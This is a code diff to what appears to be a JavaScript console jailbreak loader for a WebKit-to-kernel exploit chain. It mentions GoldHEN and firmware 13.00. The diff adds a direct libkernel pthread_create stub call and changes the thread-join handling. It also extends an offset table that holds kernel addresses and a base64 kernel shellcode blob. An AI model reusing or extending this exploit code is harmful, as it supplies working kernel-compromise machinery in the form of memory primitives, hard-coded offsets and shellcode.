@@ -172,8 +172,18 @@ async function load_bin() {
   mem.copy(entry_addr, bin_u8.buffer.data(), bin_u8.length);
 
   const pthread_addr_addr = mem.alloc(8);
+  mem.bset(pthread_addr_addr, 8);
 
-  if (fn.pthread_create.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
+  // 13.00 has no WebKit pthread_create offset. Call the libkernel syscall stub
+  // directly, exactly like the hardware-verified chain does.
+  const fw_impl = impl_map[version.major] || {};
+  const raw_impl = fw_impl[version.minor] || {};
+  const use_direct = raw_impl.k_pthread_create !== undefined;
+  const create_fn = use_direct
+    ? new NativeFunction(libkernel_base.add(raw_impl.k_pthread_create), 'number')
+    : fn.pthread_create;
+
+  if (create_fn.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
     throw new Error('Unable to create bin thread !!');
   }
 
@@ -182,15 +192,20 @@ async function load_bin() {
 
   logger.info(`Created bin thread with id ${pthread_id} !!`);
 
-  const ret_addr = mem.alloc(8);
+  // GoldHEN stays resident, so joining here would block forever. Keep the
+  // original join behaviour only for firmwares without a direct stub offset.
+  if (!use_direct) {
+    const ret_addr = mem.alloc(8);
 
-  if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
-    throw new Error(`Unable to join thread ${pthread_id} !!`);
+    if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
+      throw new Error(`Unable to join thread ${pthread_id} !!`);
+    }
+
+    const ret = arw.view(ret_addr).getInt32(0, true);
+
+    logger.info(`bin returned ${ret} !!`);
+    mem.free(ret_addr);
   }
-
-  const ret = arw.view(ret_addr).getInt32(0, true);
-
-  logger.info(`bin returned ${ret} !!`);
 
   mem.free(pthread_addr_addr);
 }
@@ -883,6 +898,10 @@ const impl_map = {
       k_kl_lock: 0xe6c20,
       k_sysent_661: 0x110a760,
       k_jmp_qword_ptr_rsi: 0x47b31,
+      // This firmware has no WebKit wrapper offsets for pthread_create/join;
+      // call the libkernel syscall stub directly instead.
+      wk___imp_pthread_create: 0x3cb9c00,
+      k_pthread_create: 0x10110,
       k_shellcode:
         'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',
 
